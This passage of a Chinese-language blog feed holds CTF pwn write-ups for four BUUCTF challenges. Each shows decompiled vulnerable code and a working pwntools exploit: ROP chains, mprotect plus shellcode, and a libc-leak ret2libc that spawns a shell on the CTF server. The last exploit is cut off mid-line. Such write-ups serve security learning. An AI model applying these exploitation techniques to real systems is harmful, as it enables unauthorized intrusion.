    <content type="html"><![CDATA[<h1 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h1><p>看保护</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO<span class="comment">//没开</span></span><br><span class="line">Stack:    No canary found<span class="comment">//没开</span></span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span><span class="comment">//没开</span></span></span><br></pre></td></tr></table></figure><p>main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;echo -n \&quot;What&#x27;s your name? \&quot;&quot;</span>);</span><br><span class="line">  __isoc99_scanf((__int64)<span class="string">&quot;%s&quot;</span>, (__int64)&amp;v4);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome to the Pwn World, %s!\n&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们找字符串</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">0000000000601048</span>                 <span class="keyword">public</span> binsh</span><br><span class="line">.data:<span class="number">0000000000601048</span> binsh           db <span class="string">&#x27;/bin/sh&#x27;</span></span><br></pre></td></tr></table></figure><p>然后就有如下内容,那我们就可以直接间接性的rop拼接起来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./babyrop&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25973</span>)</span><br><span class="line">rdi_ret=<span class="number">0x0000000000400683</span></span><br><span class="line">binsh=<span class="number">0x0000000000601048</span></span><br><span class="line">system_addr=<span class="number">0x00000000004005E3</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(rdi_ret)+p64(binsh)+p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HarekazeCTF2019-baby-rop&quot;&gt;&lt;a href=&quot;#HarekazeCTF2019-baby-rop&quot; class=&quot;headerlink&quot; title=&quot;[HarekazeCTF2019]baby_rop&quot;&gt;&lt;/a&gt;[HarekazeCTF2</summary>
      
    
    
    
    
    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>buuctf-not_the_same_3dsctf_2016</title>
    <link href="http://example.com/2022/01/16/buuctf-not-the-same-3dsctf-2016/"/>
    <id>http://example.com/2022/01/16/buuctf-not-the-same-3dsctf-2016/</id>
    <published>2022-01-16T13:01:06.000Z</published>
    <updated>2022-01-16T13:01:47.369Z</updated>
    
    <content type="html"><![CDATA[<h2 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h2><p>看保护</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO//没开</span><br><span class="line">Stack:    No canary found//没开</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)//没开</span><br></pre></td></tr></table></figure><p>我们看向伪代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+Fh] [ebp-2Dh]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;</span>);</span><br><span class="line">  gets(&amp;v4);<span class="comment">//漏洞函数</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们找/bin/sh等字符串发现没有其中的字符串,但是搜索flag，有一个flag.txt,找到一个函数为get_secret()函数</p><p>get_secret()函数如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_secret</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// esi</span></span><br><span class="line"></span><br><span class="line">  v0 = fopen(<span class="string">&quot;flag.txt&quot;</span>, &amp;unk_80CF91B);</span><br><span class="line">  fgets(&amp;fl4g, <span class="number">45</span>, v0);</span><br><span class="line">  <span class="keyword">return</span> fclose(v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> fgets函数是读取一句字符串,读取到fl4g中fl4g的bss段</p><p>这个时候可以正常rop用write读出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line"><span class="comment">#io=process(&#x27;./not_the_same_3dsctf_2016&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26903</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss=<span class="number">0x080eca2d</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2d</span>+p32(<span class="number">0x80489a0</span>)+p32(elf.sym[<span class="string">&#x27;write&#x27;</span>])+p32(bss)+p32(<span class="number">1</span>)+p32(bss)+p32(<span class="number">42</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>之后看他们的博客有第2种办法这个办法,是我没有涉及到的思路,我们看向wp吧,来解析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26903</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line">read_addr=elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">mprotect=<span class="number">0x806ED40</span></span><br><span class="line">addr=<span class="number">0x80eb000</span></span><br><span class="line">p3_ret=<span class="number">0x806fcc8</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload  =<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2d</span>+p32(mprotect)+p32(p3_ret)</span><br><span class="line">payload +=p32(addr)+p32(<span class="number">0x100</span>)+p32(<span class="number">0x7</span>)</span><br><span class="line"></span><br><span class="line">payload +=p32(read_addr)+p32(p3_ret)</span><br><span class="line"></span><br><span class="line">payload +=p32(<span class="number">0</span>)+p32(addr)+p32(<span class="built_in">len</span>(shellcode))+p32(addr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>他这里是用mprotect函数，可以用它来修改我们内存栈的权限，让它可读可写可执行，接着让写入shellcode，然后执行获取shell</p><p>首先<code>0x2d</code>是main函数中栈空间的大小，它的下一个位置就是ret指令对应的返回地址了</p><p>p32(mprotect)就是mprotect函数的地址，接下来的p32(pop)是为了保持栈平衡而将后面压入的三个参数从栈上弹出，弹出后我们并不使用它，就是为了控制栈的结构，p32(pop)的位置也同样是执行完mprotect后的返回地址，pop对应的指令为 pop esi ; pop ebx ; pop edx ; ret，最后ret就跳转到p32(read_addr)这里了</p><p>同理，<code>p32(read_addr)</code>的下一个<code>p32(addr)</code>也是执行完read函数后跳转的地址，后面是read的三个参数</p><p>整个思路就是，利用<code>mprotect</code>函数修改bss段为<code>0x7</code>即<code>0b111</code>，可读可写可执行权限，然后利用read函数读入shellcode，最后跳转到shellcode的位置，就成功拿到shell了</p><p>小结:</p><p>好像也是可以用printf输出flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;not-the-same-3dsctf-2016&quot;&gt;&lt;a href=&quot;#not-the-same-3dsctf-2016&quot; class=&quot;headerlink&quot; title=&quot;not_the_same_3dsctf_2016&quot;&gt;&lt;/a&gt;not_the_same_3</summary>
      
    
    
    
    
    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>buuctf-ciscn_2019_en_2</title>
    <link href="http://example.com/2022/01/16/buuctf-ciscn-2019-en-2/"/>
    <id>http://example.com/2022/01/16/buuctf-ciscn-2019-en-2/</id>
    <published>2022-01-16T11:40:32.000Z</published>
    <updated>2022-01-16T11:41:11.936Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h1><p>正常看保护</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO//没开</span><br><span class="line">Stack:    No canary found//没开</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)//没开</span><br></pre></td></tr></table></figure><p>然后我们看向代码main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EEEEEEE                            hh      iii                &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;====================================================================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to this Encryption machine\n&quot;</span>);</span><br><span class="line">  begin(<span class="string">&quot;Welcome to this Encryption machine\n&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      fflush(<span class="number">0LL</span>);</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">      getchar();</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;I think you can do it by yourself&quot;</span>);</span><br><span class="line">      begin(<span class="string">&quot;I think you can do it by yourself&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bye!&quot;</span>);<span class="comment">//输入3,输出Bye，然后退出</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    encrypt();<span class="comment">//这个函数有漏洞点</span></span><br><span class="line">    begin(<span class="string">&quot;%d&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Something Wrong!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>encrypt函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">encrypt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your Plaintext to be encrypted&quot;</span>);</span><br><span class="line">  gets(s);<span class="comment">//漏洞函数</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)x;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(s) )<span class="comment">//判断是否大于或等于</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[x] &lt;= <span class="number">96</span> || s[x] &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( s[x] &lt;= <span class="number">64</span> || s[x] &gt; <span class="number">90</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( s[x] &gt; <span class="number">47</span> &amp;&amp; s[x] &lt;= <span class="number">57</span> )</span><br><span class="line">          s[x] ^= <span class="number">0xC</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        s[x] ^= <span class="number">0xD</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      s[x] ^= <span class="number">0xE</span>u;</span><br><span class="line">    &#125;</span><br><span class="line">    ++x;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ciphertext&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有getshell函数,没有system,想法是泄漏libc来打远程,然后用\0来绕过strlen的判断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27062</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./ciscn_2019_en_2&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./ciscn_2019_en_2&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">rdi_ret=<span class="number">0x0000000000400c83</span></span><br><span class="line">ret_addr=<span class="number">0x00000000004006b9</span></span><br><span class="line">main_addr=<span class="number">0x0000000000400B28</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;\0&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x58</span>-<span class="number">1</span>)+p64(rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;choice!\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;encrypted\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#接受puts_addr的真实地址,</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;puts_addr=&quot;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice!\n&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">payload1=<span class="string">b&#x27;\0&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x58</span>-<span class="number">1</span>)+p64(ret_addr)+p64(rdi_ret)+p64(binsh_addr)+p64(sys_addr)+p64(main_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>,payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ciscn-2019-en-2&quot;&gt;&lt;a href=&quot;#ciscn-2019-en-2&quot; class=&quot;headerlink&quot; title=&quot;ciscn_2019_en_2&quot;&gt;&lt;/a&gt;ciscn_2019_en_2&lt;/h1&gt;&lt;p&gt;正常看保护&lt;/p&gt;
&lt;figure </summary>
      
    
    
    
    
    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>buuctf-bjdctf_2020_babystack</title>
    <link href="http://example.com/2022/01/14/buuctf-bjdctf-2020-babystack/"/>
    <id>http://example.com/2022/01/14/buuctf-bjdctf-2020-babystack/</id>
    <published>2022-01-14T13:30:47.000Z</published>
    <updated>2022-01-14T13:31:37.373Z</updated>
    
    <content type="html"><![CDATA[<h1 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h1><p>查看保护</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO//没开</span><br><span class="line">Stack:    No canary found//没开</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)//没开</span><br></pre></td></tr></table></figure><p>main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  LODWORD(nbytes) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;**********************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*     Welcome to the BJDCTF!     *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* And Welcome to the bin world!  *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*  Let&#x27;s try to pwn the world!   *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* Please told me u answer loudly!*&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Are u ready?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Please input the length of your name:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]What&#x27;s u name?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实由上而下来看是要你制造一个溢出漏洞,nbytes这个变量就是你要弄buf的大小</p><p>backdoor函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 backdoor()</span><br><span class="line">&#123;</span><br><span class="line">  system(&quot;/bin/sh&quot;);</span><br><span class="line">  return 1LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28616</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./bjdctf_2020_babystack&#x27;)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;50&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">payload=<span class="number">0x18</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span 